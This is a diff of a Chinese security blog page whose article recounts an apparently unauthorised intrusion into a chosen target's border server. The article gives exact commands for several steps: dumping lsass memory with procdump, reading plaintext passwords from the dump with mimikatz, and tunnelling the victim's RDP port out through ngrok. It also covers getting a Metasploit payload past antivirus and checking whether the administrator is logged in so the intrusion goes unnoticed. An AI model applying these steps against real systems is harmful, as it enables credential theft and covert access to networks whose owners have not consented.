@@ -8,12 +8,13 @@
   <link rel="dns-prefetch" href="http://yoursite.com">
   <title>记一次实战渗透过程中的知识点总结 | Hit0n&#39;s bolg</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="前言最近闲的时候在搞指定目标入侵，在拿到目标后，经过广泛的信息收集，找到一个脆弱站点，拿下目标边界一台服务器（文件上传）。虽然直接是system权限，但是想连入目标远程桌面进行更深层次的信息收集，然而却遇到各种问题，做个笔记记录下。 0x01 知识点一拿下目标shell后发现直接是system权限。system权限虽然说可以干各种各样的事，但是个人一般不会随随便便去新建账户或者改密码，这样很容易被">
+  <meta name="description" content="前言最近闲的时候在搞指定目标入侵，在拿到目标后，经过广泛的信息收集，找到一个脆弱站点，拿下目标边界一台服务器（文件上传）。虽然直接是system权限，但是想连入目标远程桌面进行更深层次的信息收集，然而却遇到各种问题，做个笔记记录下。">
+<meta name="keywords" content="总结,实战">
 <meta property="og:type" content="article">
 <meta property="og:title" content="记一次实战渗透过程中的知识点总结">
 <meta property="og:url" content="http://yoursite.com/2018/09/21/记一次实战渗透过程中的知识点总结/index.html">
 <meta property="og:site_name" content="Hit0n&#39;s bolg">
-<meta property="og:description" content="前言最近闲的时候在搞指定目标入侵，在拿到目标后，经过广泛的信息收集，找到一个脆弱站点，拿下目标边界一台服务器（文件上传）。虽然直接是system权限，但是想连入目标远程桌面进行更深层次的信息收集，然而却遇到各种问题，做个笔记记录下。 0x01 知识点一拿下目标shell后发现直接是system权限。system权限虽然说可以干各种各样的事，但是个人一般不会随随便便去新建账户或者改密码，这样很容易被">
+<meta property="og:description" content="前言最近闲的时候在搞指定目标入侵，在拿到目标后，经过广泛的信息收集，找到一个脆弱站点，拿下目标边界一台服务器（文件上传）。虽然直接是system权限，但是想连入目标远程桌面进行更深层次的信息收集，然而却遇到各种问题，做个笔记记录下。">
 <meta property="og:locale" content="zh">
 <meta property="og:image" content="https://i.imgur.com/zawL4Ap.png">
 <meta property="og:image" content="https://i.imgur.com/YYI4l5T.png">
@@ -27,10 +28,10 @@
 <meta property="og:image" content="https://i.imgur.com/ArEn19O.png">
 <meta property="og:image" content="https://i.imgur.com/HzEoe1N.png">
 <meta property="og:image" content="https://i.imgur.com/a9QK5AJ.png">
-<meta property="og:updated_time" content="2018-09-21T03:57:47.301Z">
+<meta property="og:updated_time" content="2018-11-12T08:33:48.410Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="记一次实战渗透过程中的知识点总结">
-<meta name="twitter:description" content="前言最近闲的时候在搞指定目标入侵，在拿到目标后，经过广泛的信息收集，找到一个脆弱站点，拿下目标边界一台服务器（文件上传）。虽然直接是system权限，但是想连入目标远程桌面进行更深层次的信息收集，然而却遇到各种问题，做个笔记记录下。 0x01 知识点一拿下目标shell后发现直接是system权限。system权限虽然说可以干各种各样的事，但是个人一般不会随随便便去新建账户或者改密码，这样很容易被">
+<meta name="twitter:description" content="前言最近闲的时候在搞指定目标入侵，在拿到目标后，经过广泛的信息收集，找到一个脆弱站点，拿下目标边界一台服务器（文件上传）。虽然直接是system权限，但是想连入目标远程桌面进行更深层次的信息收集，然而却遇到各种问题，做个笔记记录下。">
 <meta name="twitter:image" content="https://i.imgur.com/zawL4Ap.png">
   
     <link rel="alternative" href="/atom.xml" title="Hit0n&#39;s bolg" type="application/atom+xml">
@@ -170,12 +171,32 @@
         <a href="/2018/09/21/记一次实战渗透过程中的知识点总结/" class="archive-article-date">
   	<time datetime="2018-09-21T02:30:01.352Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-09-21</time>
 </a>
+		
+          <div style="margin-top:10px;">
+    <span class="post-time">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-keyboard-o"></i>
+        <span class="post-meta-item-text">  字数统计: </span>
+        <span class="post-count">946字</span>
+      </span>
+    </span>
+
+    <span class="post-time">
+      &nbsp; | &nbsp;
+      <span class="post-meta-item-icon">
+        <i class="fa fa-hourglass-half"></i>
+        <span class="post-meta-item-text">  阅读时长: </span>
+        <span class="post-count">3分</span>
+      </span>
+    </span>
+</div>
+          
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近闲的时候在搞指定目标入侵，在拿到目标后，经过广泛的信息收集，找到一个脆弱站点，拿下目标边界一台服务器（文件上传）。虽然直接是system权限，但是想连入目标远程桌面进行更深层次的信息收集，然而却遇到各种问题，做个笔记记录下。</p>
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近闲的时候在搞指定目标入侵，在拿到目标后，经过广泛的信息收集，找到一个脆弱站点，拿下目标边界一台服务器（文件上传）。虽然直接是system权限，但是想连入目标远程桌面进行更深层次的信息收集，然而却遇到各种问题，做个笔记记录下。<br><a id="more"></a></p>
 <h2 id="0x01-知识点一"><a href="#0x01-知识点一" class="headerlink" title="0x01 知识点一"></a>0x01 知识点一</h2><p>拿下目标shell后发现直接是system权限。<br><img src="https://i.imgur.com/zawL4Ap.png" alt=""><br><br>system权限虽然说可以干各种各样的事，但是个人一般不会随随便便去新建账户或者改密码，这样很容易被管理员发现。这里我选择的是传一个msf码子弹个meterpreter sessions回来。然而码子一传上去就被杀了，<code>tasklist /svc</code>发现可疑进程查询后得知是一款趋势科技的杀软。<code>kill pid</code>结束不掉，怎么办？免杀呗。经过免杀处理后能成功上传，正向反向都试了一遍，但是session还是始终弹不回来。大概就是下面这个样子，始终到不了ESTABLISHED状态。由于之前没保存图，又懒得再去搞一遍就这么描述一下吧。<img src="https://i.imgur.com/YYI4l5T.png" alt=""><br>这里我讲一下为什么我想弹meterpreter回来。主要是为了方便打内网和读密码。既然msf行不通那就只能变换思路。怎么办呢？无奈，只好去新建一个隐藏账户了，然而问题又来了，虽然执行命令没回显基本上是成功了，但是最后去连3389显示用户不存在。<img src="https://i.imgur.com/V1lBuSU.png" alt=""><br>是什么原因导致这种情况,我们把原因归结到杀软上，以为可能是杀软限制了执行与用户相关操作的命令，实际原因等我们最后登录上3389后发现并不是，这里是一个坑，还有怎么登上3389的文章最后再提。咋办？传mimikatz？失败，传不上。然后队友想到了一个好办法，mimikatz是从内存中读密码的。那么我们能不能把它的内存给导出来？最后找到一款绝对免杀的工具（微软官方工具）prodump，上传prodump.exe执行命令<code>prodump.exe -accepteula -ma lsass.exe lsass.dmp</code>成功导出内存。<img src="https://i.imgur.com/SfE6vAP.png" alt=""><br><br><img src="https://i.imgur.com/jZ19U6Y.png" alt=""><br>下载到本地用mimikatz读取。把<code>lsass.dmp</code>放到mimikatz目录下，执行命令<code>sekurlsa::minidmp lsass.dmp</code>和<code>sekurlsa::logonPasswords full</code>即可读出密码。直接读出了明文密码。<img src="https://i.imgur.com/5I8ypg2.png" alt=""></p>
 <h2 id="0X02-知识点二"><a href="#0X02-知识点二" class="headerlink" title="0X02 知识点二"></a>0X02 知识点二</h2><p>密码拿到了，连接3389试一下。然而，他只允许内网连接，尝试了用正向代理的方式，没成功，最后用了一款反向代理工具ngrok直接把它3389映射了出来。<br><img src="https://i.imgur.com/Ixwr85M.png" alt=""><br><br>ngrok需要到它的官网用邮箱注册，因为他实际上并不会验证，推荐使用临时邮箱。将ngrok上传到目标主机上。首先到ngrok官网上找到你的token。<br><img src="https://i.imgur.com/9F8Qz9V.png" alt=""><br><br>然后在目标主机上执行命令<code>ngrok.exe authtoken your token</code><br><img src="https://i.imgur.com/Z0lxcse.png" alt=""><br><br>然后在执行<code>ngrok.exe tcp 3389</code>即可，现在它的3389已经映射出来了。可以直接连接了，在连接之前要先查询下管理员是否在线使用命令<code>quser</code>即可。<img src="https://i.imgur.com/ArEn19O.png" alt=""><br>如果在线的话，贸然登录会把管理员给挤下去很容易被发现。这里我就贴一张之前登录成功的图吧。<br><img src="https://i.imgur.com/HzEoe1N.png" alt="">连接3389的方式，进入你的ngrok找到status复制里面的URL即可。<img src="https://i.imgur.com/a9QK5AJ.png" alt=""></p>
 <h2 id="0x03-写在后面的话"><a href="#0x03-写在后面的话" class="headerlink" title="0x03 写在后面的话"></a>0x03 写在后面的话</h2><p>最后登录进去是个什么情况了，发现他有密码复杂度和长度要求。所以我们之前添加用户没有成功并不是因为杀软的阻拦，以后添加用户密码一定得设置的复杂点。另外这个内网很大。</p>
@@ -208,6 +229,21 @@
     <div class="article-info article-info-index">
       
       
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">总结</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">实战</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
       
 
       
@@ -272,11 +308,11 @@
   
 <nav id="article-nav">
   
-    <a href="/2018/10/19/记一次曲折的Linux提权/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2018/10/25/PHP代码审计之piwigo SQL injection（in_array()函数缺陷）/" id="article-nav-newer" class="article-nav-link-wrap">
       <i class="icon-circle-left"></i>
       <div class="article-nav-title">
         
-          记一次曲折的Linux提权
+          PHP代码审计之piwigo SQL injection（in_array()函数缺陷）
         
       </div>
     </a>
@@ -407,6 +443,30 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
             <input type="checkbox" q-on="click:toggleTag(e)" q-attr="checked:showTags">
           </label>
           <ul class="article-tag-list" q-show="showTags">
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">代码审计</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">python</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">总结</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">实战</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">提权</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">内网</a>
+              </li>
             
             <div class="clearfix"></div>
           </ul>
